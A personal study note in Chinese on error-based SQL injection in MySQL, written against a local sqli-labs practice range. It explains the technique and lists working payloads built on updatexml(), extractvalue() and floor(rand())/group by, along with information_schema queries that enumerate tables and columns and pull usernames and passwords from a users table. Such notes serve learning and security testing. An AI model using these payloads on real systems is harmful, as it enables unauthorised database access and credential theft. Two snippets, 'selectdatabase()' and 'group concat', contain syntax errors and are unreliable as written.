# 报错注入

## 一、环境

- 靶场：自建本地 sqli-labs-master 靶场
- 工具：Burp Suite + HackBar
- 数据库：MySQL

## 二、报错注入是什么

报错注入利用数据库执行 SQL 时产生的**错误信息**，让数据库把我们想获取的数据带到报错信息中，从而实现数据回显。

适用于**页面没有正常查询结果回显，但能够显示数据库报错信息**的情况。

## 三、基本思路

先判断注入点 → 确认数据库类型 → 利用数据库报错函数 → 把需要查询的数据拼接进报错信息中。

常见思路：

```sql
' and updatexml(1,concat(0x7e,database(),0x7e),1)--+
```

如果页面返回类似：

```text
XPATH syntax error: '~xxx~'
```

说明 `database()` 查询出的数据库名被带到了报错信息中。

## 四、常用函数

### 1.group by

**floor + rand：利用 group by 产生重复键错误 → 数据出现在 Duplicate entry 报错里**

```sql
(select 1 from (
    select count(*),
           concat(0x5e, (select database()), 0x5e, floor(rand()*2)) x
    from information_schema.tables
    group by x
) a)
```

### 2. updatexml()

常用于制造 XPath 报错：

```sql
updatexml(1,concat(0x7e,(selectdatabase()),0x7e),1)
```

核心不是为了真正修改 XML，而是**故意制造错误，让数据出现在报错信息中**。

### 3. extractvalue()

另一种常见的报错函数：

```sql
extractvalue(1,concat(0x7e,database(),0x7e))
```

## 五、利用 information_schema

知道数据库名后，可以进一步查询表名：

```sql
select group_concat(table_name)
from information_schema.tables
where table_schema=database()
```

查询字段名：

```sql
select group_concat(column_name)
from information_schema.columns
where table_schema=database()
and table_name='users'
```

查询数据：

```sql
select group_concat(username,0x3a,password)
from users
```

然后把查询结果放进报错函数：

```sql
' and updatexml(1,concat(0x7e,(select database()),0x7e),1)--+
```

## 六、concat() 的作用

`concat()` 用来把多个内容拼接起来：

group concat（）用来把多行内容拼成一行内容输出：

```sql
concat(0x7e,database(),0x7e)
group concat(0x7e,database(),0x7e)
```

相当于：

```text
~数据库名~
```

加 `0x7e`（`~`）主要是为了让报错内容更容易观察和定位。

## 七、我的理解

报错注入的核心其实就是：

**让数据库报错 → 把查询结果塞进错误信息 → 从错误信息中读取数据。**

和联合查询相比，报错注入不依赖正常页面回显，只要**数据库错误信息能够显示出来**，就可能利用报错进行数据回显。

## 八、注意

- 报错注入依赖数据库返回错误信息。
- `updatexml()`、`extractvalue()` 是常见的报错注入函数。
- `information_schema` 可以进一步获取数据库中的表、字段等结构信息。
- 实际注入时还需要根据**闭合方式、注释方式、数据库版本和页面回显情况**调整 Payload。
